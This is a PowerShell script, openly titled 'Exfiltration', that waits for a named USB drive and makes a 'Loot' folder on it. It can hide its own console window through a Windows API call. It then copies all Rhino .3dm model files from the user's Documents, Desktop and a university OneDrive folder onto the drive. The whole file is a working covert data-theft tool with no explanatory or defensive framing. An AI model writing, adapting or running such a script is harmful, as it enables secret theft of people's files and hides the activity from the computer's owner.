[Console]::BackgroundColor = "Black"
[Console]::SetWindowSize(57, 5)
[Console]::Title = "Exfiltration"
Clear-Host

# Checking and getting the USB drive name if it is not provided
if($driveName.length -lt 1){
    $driveName = Read-Host "Enter the name of the USB drive "
}

# Checking if the window should be hidden
if($hidden.length -lt 1){
    $hidden = Read-Host "Would you like to hide this console window? (Y/N) "
}

$i = 10

# Waiting for the USB drive to be connected
While ($true){
    cls
    Write-Host "Waiting for USB Drive.. ($i)" -ForegroundColor Yellow
    $drive = Get-WMIObject Win32_LogicalDisk | Where-Object {$_.VolumeName -eq $driveName} | select DeviceID
    sleep 1
    if ($drive.length -ne 0){
        Write-Host "USB Drive Connected!" -ForegroundColor Green
        break
    }
    $i--
    if ($i -eq 0 ){
        Write-Host "Timeout! Exiting" -ForegroundColor Red
        sleep 1
        exit
    }
}

# Set console window size
[Console]::SetWindowSize(80, 30)

# Get the correct drive letter
$drive = Get-WMIObject Win32_LogicalDisk | Where-Object {$_.VolumeName -eq $driveName}
$driveLetter = $drive.DeviceID
Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green

# Now only searching for .3dm files (Rhino 3D model)
$fileExtensions = @("*.3dm")

# Folders to search for .3dm files (removed Downloads, added OneDrive path)
$foldersToSearch = @(
    "$env:USERPROFILE\Documents", 
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

$destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"

# Ensure that the destination folder exists
if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath -Force
    Write-Host "New Folder Created: $destinationPath"  -ForegroundColor Green
}

# Hiding the window if required
If ($hidden -eq 'y'){
    Write-Host "Hiding the Window.."  -ForegroundColor Red
    sleep 1
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    }
    else{
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# Loop through all specified folders to search for .3dm files
foreach ($folder in $foldersToSearch) {
    Write-Host "Searching in $folder"  -ForegroundColor Yellow
    
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File

        # Ensure that files are found before proceeding
        if ($files.Count -eq 0) {
            Write-Host "No .3dm files found in $folder" -ForegroundColor Red
        }

        foreach ($file in $files) {
            $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
            Write-Host "Copying $($file.FullName) to $($destinationFile)"  -ForegroundColor Gray
            # Copy the file to the USB drive
            try {
                Copy-Item -Path $file.FullName -Destination $destinationFile -Force
                Write-Host "File copied successfully!" -ForegroundColor Green
            } catch {
                Write-Host "Error copying file: $_" -ForegroundColor Red
            }
        }
    }
}

# Notify that the exfiltration is complete
If ($hidden -eq 'y'){
    (New-Object -ComObject Wscript.Shell).Popup("File Exfiltration Complete",5,"Exfiltration",0x0)
}
else{
    Write-Host "File Exfiltration Complete" -ForegroundColor Green
}
